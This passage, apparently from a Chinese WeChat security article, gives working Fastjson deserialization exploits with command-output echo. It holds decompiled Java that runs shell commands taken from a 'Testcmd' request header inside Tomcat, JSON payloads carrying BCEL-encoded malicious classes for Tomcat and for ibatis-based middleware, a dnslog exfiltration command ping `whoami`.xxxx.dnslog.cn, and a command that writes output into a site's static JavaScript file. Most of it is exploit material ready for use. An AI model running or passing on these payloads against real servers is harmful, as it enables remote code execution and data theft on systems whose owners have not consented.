                for(int var2 = 0; var2 < var1.length; ++var2) {                Thread var3 = var1[var2];                if (var3 != null) {                    String var4 = var3.getName();                    if (!var4.contains("exec") && var4.contains("http")) {                        Object var5 = getFV(var3, "target");                        if (var5 instanceof Runnable) {                            try {                                var5 = getFV(getFV(getFV(var5, "this$0"), "handler"), "global");                            } catch (Exception var11) {                                continue;                            }  
                                List var6 = (List)getFV(var5, "processors");  
                                for(int var7 = 0; var7 < var6.size(); ++var7) {                                Object var8 = var6.get(var7);                                var5 = getFV(var8, "req");                                Object var9 = var5.getClass().getMethod("getResponse").invoke(var5);                                var4 = (String)var5.getClass().getMethod("getHeader", String.class).invoke(var5, new String("Testecho"));                                if (var4 != null && !var4.isEmpty()) {                                    var9.getClass().getMethod("setStatus", Integer.TYPE).invoke(var9, new Integer(200));                                    var9.getClass().getMethod("addHeader", String.class, String.class).invoke(var9, new String("Testecho"), var4);                                    var0 = true;                                }  
                                    var4 = (String)var5.getClass().getMethod("getHeader", String.class).invoke(var5, new String("Testcmd"));                                if (var4 != null && !var4.isEmpty()) {                                    var9.getClass().getMethod("setStatus", Integer.TYPE).invoke(var9, new Integer(200));                                    String[] var10 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", var4} : new String[]{"/bin/sh", "-c", var4};                                    writeBody(var9, (new Scanner((new ProcessBuilder(var10)).start().getInputStream())).useDelimiter("\\A").next().getBytes());                                    var0 = true;                                }  
                                    if ((var4 == null || var4.isEmpty()) && var0) {                                    writeBody(var9, System.getProperties().toString().getBytes());                                }  
                                    if (var0) {                                    break;                                }                            }  
                                if (var0) {                                break;                            }                        }                    }                }            }        } catch (Exception var12) {        }  
        }}  
    

### Tomcat 回显

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    {    "a": {        "@type": "java.lang.Class",        "val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"    },    "b": {        "@type": "java.lang.Class",        "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"    },    "c": {        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",        "driverClassLoader": {            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"        },        "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e1$98$c6b$fa$e2$R$c1$7e$3c$e0$d8$x$9f$d6mt$ba$86$9e$i$3d$bd$f5$e3$e0$8e$d1$86$c3$cd$b4$fa$i$o$89$d0T$84$8b$b1r$a3$f4$91$e8$r$ea$8b$B$d7$E$dc$3d$e1$i$3c$dd$e1$80$d7w$S$be$b8$3b$c0$c7$e2$9e$87$m$c4$e2$5e$b6$e6$e0o$f4$9e$84$Yw7$Q$dd$d9$9d$40I$dc$3d$O$89$Il$dbp$8a$ed$89$b3tG$7d$O$b3$Ce$k$5bQ$98$u$e5$f5$k$5b$a2$d1$be$cd$e2P$b3$t$Q$b0m$G$w$3d$93$e6$c8D$d8$937Al$ddWS$d2$fe$ff$x9F$99$A$M$faN$ae$b0$9f$e3$98M$U$96$af$b5$u$a3$b5$83$f2$b6$89$b2$b4$99h$9dt$bf$9d8o$82$85$z8$80$$$dcG$rx$98h$e3$94$fe$e3T$80$d3$94$d5$a7$89$f3$F$f4$d2$_0$H$ee$e7a$f2x$d5$f3$d8$c8$e3$96$L$d8$c0c$H$8f$5b$R$cfW$ad$8e$caA$l$TN9$f0$A$dcv9Vr$b6$d7$U$96$f8$m$aa$c3$N9TugQ$da$ec$a1$C$cd$e9$c9$5ez$ae$f11H$tP$jo$YG$cd$e9FO$O$c1F$S$98$7b$944$96$a2$92$be$e4$ab$f3A$y$87D$eb$O$3a$dd$K$9e$y$95b$X$dd$dfF$f7$afF$Nn$t$ac$dc$81EPP$8b$E$c2$Y$m$feA$db$f1$Kx$$$80$e7$b1$8b$9c$ed$e1q$9b_$wpY$m$e1$3c$d8$dc$s$9dJ$A$d7$cd$ee$96$J$cc$cba$7e$e0$9a$J$y8$83$85$f4$d7$e5$5e3$bf$e1$d4$R$d7$f5$N$f3$97$f7$84$cf$ba$96$90$fb$8b$9a$3dAO$60q$O$d7$kvU$d1$ee$V$b4$hs$95$84$D$b5$q$d6$ec$Nz$l$c5$921$ee$a5$a07$b0$94$I$81el$J$d9WY$I$cd$be$y$f7$y$5d$d5$db$s$g$9a$7d$ee$V$7c$V$l$f4$jG$p$87$p$dc$a9$a0$af$8a$3f$8e$b0$L$cdBP$ID$f2$gY$fd$a3n$aa$3f$d5$3e$e8$a5$8dH$85o$f6$3b$X$d7$e5q$d3$U$b3o$3dyX7$c5$D$cb$c7q$3d$83$c8$Z41$9f$cfb$uH$89$be$e10$94$a0$9fI$be$d2$91tZ$a3$3c$e8$f7$5c$ee$88$K$9cc$7d$c0$e0$e5$b0$ae$f0N$g$89$7b$f2$96$fc$de$Z$96$e2d$c3$W$f1$b4$5c$cd$b3$hgz6$96$f7$ec$de$ff$c1$b3$c0$ca$J$ac$ca$a19$d0$c2$w$80$m$f5$7c$TY$5b$cd$5c$5cC$zO$dedQ$9d$a7$aee$d4u$O$b5Y$M$faO$60$7d$fc$E6$c4$83$e28Zsh$cba$e38$da$D$j9l$caas$O$9d$T$b8$89$e2$m$d7Jl$d7$c6P5w$M$VA$ff$E$b6$e4$d0$e50$Q$c5$97$85$ff$m$cfe$_$ae$9e$3c$b8$b8$ec$85$t$b2$f0la$8d$d9$D$99pYG$f0$earm$a5$a7$83$e9$p$I$d1$w$d0$c9O$cdZ$82$f9$84$f1E$84$ecZ$ccB$3d5$edZ$94S$dbV$90t$r$c9W$93$86$d9$84$ec$wh$84$f8$M$e6$e2$m$e6$e1$k$92$ba$9f$d0$7f$M$L$f0$M$W$e2$3c$Wq$d5X$ccu$e2Zn$L$96p$fb$b0$94$bb$h$cb$b8$a3$Iq$e7Q$e7$aa$40$bd$ab$92$90U$8b$88k9$9a$5c$x$b0$dc$b5$Ks$5d$eb$b0$c2$d5$86$h$5d$j$uqua$jy$b9$c6$b5$8d$feU$ed$b5$bb$ae$fc$o$aa9$k$L$b9K4$t$7c$f6$8e$c7$ed$3c$ee$a0$v$A$da$ca$d4d$b3x$f4s$X$f0$a4$3d$Yv$bc$84C$dby$uuR$c5$L$f0$bd$I$ef$r$g$3fn$5b$Q$f87$bc$ad$q$c3$e6y$82$d4$bb$a0$fe$H$d8$3e$ebc$Z$Q$A$A"  
    

### abitis 回显

  * 

    
    
    适用于weblogic、jboss等非tomcat中间件且引入了ibatis组件的情况

  *   *   *   *   *   * 

    
    
    <dependency>    <groupId>org.mybatis</groupId>  <artifactId>mybatis</artifactId>  <version>3.5.2</version></dependency>  
    

  *   *   * 

    
    
    Testcmd:whoami  
    {"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","key":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"{$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e1$98$c6b$fa$e2$R$c1$7e$3c$e0$d8$x$9f$d6mt$ba$86$9e$i$3d$bd$f5$e3$e0$8e$d1$86$c3$cd$b4$fa$i$o$89$d0T$84$8b$b1r$a3$f4$91$e8$r$ea$8b$B$d7$E$dc$3d$e1$i$3c$dd$e1$80$d7w$S$be$b8$3b$c0$c7$e2$9e$87$m$c4$e2$5e$b6$e6$e0o$f4$9e$84$Yw7$Q$dd$d9$9d$40I$dc$3d$O$89$Il$dbp$8a$ed$89$b3tG$7d$O$b3$Ce$k$5bQ$98$u$e5$f5$k$5b$a2$d1$be$cd$e2P$b3$t$Q$b0m$G$w$3d$93$e6$c8D$d8$937Al$ddWS$d2$fe$ff$x9F$99$A$M$faN$ae$b0$9f$e3$98M$U$96$af$b5$u$a3$b5$83$f2$b6$89$b2$b4$99h$9dt$bf$9d8o$82$85$z8$80$$$dcG$rx$98h$e3$94$fe$e3T$80$d3$94$d5$a7$89$f3$F$f4$d2$_0$H$ee$e7a$f2x$d5$f3$d8$c8$e3$96$L$d8$c0c$H$8f$5b$R$cfW$ad$8e$caA$l$TN9$f0$A$dcv9Vr$b6$d7$U$96$f8$m$aa$c3$N9TugQ$da$ec$a1$C$cd$e9$c9$5ez$ae$f11H$tP$jo$YG$cd$e9FO$O$c1F$S$98$7b$944$96$a2$92$be$e4$ab$f3A$y$87D$eb$O$3a$dd$K$9e$y$95b$X$dd$dfF$f7$afF$Nn$t$ac$dc$81EPP$8b$E$c2$Y$m$feA$db$f1$Kx$$$80$e7$b1$8b$9c$ed$e1q$9b_$wpY$m$e1$3c$d8$dc$s$9dJ$A$d7$cd$ee$96$J$cc$cba$7e$e0$9a$J$y8$83$85$f4$d7$e5$5e3$bf$e1$d4$R$d7$f5$N$f3$97$f7$84$cf$ba$96$90$fb$8b$9a$3dAO$60q$O$d7$kvU$d1$ee$V$b4$hs$95$84$D$b5$q$d6$ec$Nz$l$c5$921$ee$a5$a07$b0$94$I$81el$J$d9WY$I$cd$be$y$f7$y$5d$d5$db$s$g$9a$7d$ee$V$7c$V$l$f4$jG$p$87$p$dc$a9$a0$af$8a$3f$8e$b0$L$cdBP$ID$f2$gY$fd$a3n$aa$3f$d5$3e$e8$a5$8dH$85o$f6$3b$X$d7$e5q$d3$U$b3o$3dyX7$c5$D$cb$c7q$3d$83$c8$Z41$9f$cfb$uH$89$be$e10$94$a0$9fI$be$d2$91tZ$a3$3c$e8$f7$5c$ee$88$K$9cc$7d$c0$e0$e5$b0$ae$f0N$g$89$7b$f2$96$fc$de$Z$96$e2d$c3$W$f1$b4$5c$cd$b3$hgz6$96$f7$ec$de$ff$c1$b3$c0$ca$J$ac$ca$a19$d0$c2$w$80$m$f5$7c$TY$5b$cd$5c$5cC$zO$dedQ$9d$a7$aee$d4u$O$b5Y$M$faO$60$7d$fc$E6$c4$83$e28Zsh$cba$e38$da$D$j9l$caas$O$9d$T$b8$89$e2$m$d7Jl$d7$c6P5w$M$VA$ff$E$b6$e4$d0$e50$Q$c5$97$85$ff$m$cfe$_$ae$9e$3c$b8$b8$ec$85$t$b2$f0la$8d$d9$D$99pYG$f0$earm$a5$a7$83$e9$p$I$d1$w$d0$c9O$cdZ$82$f9$84$f1E$84$ecZ$ccB$3d5$edZ$94S$dbV$90t$r$c9W$93$86$d9$84$ec$wh$84$f8$M$e6$e2$m$e6$e1$k$92$ba$9f$d0$7f$M$L$f0$M$W$e2$3c$Wq$d5X$ccu$e2Zn$L$96p$fb$b0$94$bb$h$cb$b8$a3$Iq$e7Q$e7$aa$40$bd$ab$92$90U$8b$88k9$9a$5c$x$b0$dc$b5$Ks$5d$eb$b0$c2$d5$86$h$5d$j$uqua$jy$b9$c6$b5$8d$feU$ed$b5$bb$ae$fc$o$aa9$k$L$b9K4$t$7c$f6$8e$c7$ed$3c$ee$a0$v$A$da$ca$d4d$b3x$f4s$X$f0$a4$3d$Yv$bc$84C$dby$uuR$c5$L$f0$bd$I$ef$r$g$3fn$5b$Q$f87$bc$ad$q$c3$e6y$82$d4$bb$a0$fe$H$d8$3e$ebc$Z$Q$A$A}"}}

除了以上方式，还有另外两种，

  1. 命令执行利用dnslog外带  

  * 

    
    
    ping `whoami`.xxxx.dnslog.cn

2.命令执行重定向网站静态资源，前提是需要知道网站跟路径

  * 

    
    
    ls >>/www/wwwroot/server/static/js/base.js

此次内容今晚以直播形式分享给群里粉丝。需要观看可移步至B站

https://www.bilibili.com/video/BV1Eb411f7oG/

  

参考链接：  

https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg

https://mp.weixin.qq.com/s/nKPsoNkHtNdOj-_v53Bc9w

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

